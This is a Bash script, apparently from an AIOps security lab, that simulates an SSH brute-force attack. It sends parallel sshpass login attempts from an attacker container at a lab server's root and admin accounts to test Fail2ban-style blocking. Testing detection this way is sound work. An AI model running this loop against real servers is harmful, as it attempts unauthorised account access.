#!/usr/bin/env bash
# =============================================================================
# Kịch bản 03: Dò quét mật khẩu quản trị SSH từ Internet (SSH Brute-force)
# Mục đích: Bắn liên tục các kết nối SSH với mật khẩu sai vào tài khoản quản trị
# Nguồn: internet-attacker (203.0.113.10)
# Đích: service-server (192.168.10.10:22)
# Điểm chặn tự động: Firewall hoặc Server (khóa IP sau N lần thất bại - Fail2ban)
# Công cụ: sshpass + OpenSSH client
# =============================================================================
set -euo pipefail

DURATION="${1:-60}"
P="clab-aiops-prod"
CLEANED=0
BRUTE_PID=""

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [START] Kịch bản 03: SSH Brute-force (Thời lượng: ${DURATION}s)..."

cleanup() {
  [ "$CLEANED" -eq 1 ] && return
  CLEANED=1
  echo
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [CLEANUP] Dừng SSH brute-force trên internet-attacker..."
  if [ -n "$BRUTE_PID" ]; then
    kill -TERM "$BRUTE_PID" 2>/dev/null || true
    kill -9 "$BRUTE_PID" 2>/dev/null || true
  fi
  docker exec "$P-internet-attacker" sh -c '
    if [ -f /tmp/aiops_ssh_brute.pid ]; then
      kill -9 $(cat /tmp/aiops_ssh_brute.pid) 2>/dev/null || true
      rm -f /tmp/aiops_ssh_brute.pid
    fi
    killall -9 ssh sshpass 2>/dev/null || true
  ' >/dev/null 2>&1 || true
}
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 143' TERM
trap cleanup EXIT

echo "  [+] Bắt đầu dò quét mật khẩu SSH dồn dập vào 192.168.10.10:22..."
docker exec "$P-internet-attacker" sh -c "
  echo \$\$ > /tmp/aiops_ssh_brute.pid
  STOP_TIME=\$((\$(date +%s) + $DURATION))
  while [ \$(date +%s) -lt \$STOP_TIME ]; do
    for u in opsadmin root admin user; do
      for p in test1 test2 test3 test4 test5 test6 test7 test8; do
        sshpass -p \"\$p\" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=1 \"\$u@192.168.10.10\" id >/dev/null 2>&1 &
      done
    done
    wait 2>/dev/null || true
    sleep 0.5
  done
  rm -f /tmp/aiops_ssh_brute.pid
" &
BRUTE_PID=$!

wait "$BRUTE_PID" 2>/dev/null || true
cleanup

echo "[$(date '+%Y-%m-%d %H:%M:%S')] [END] Kịch bản 03: SSH Brute-force hoàn thành."
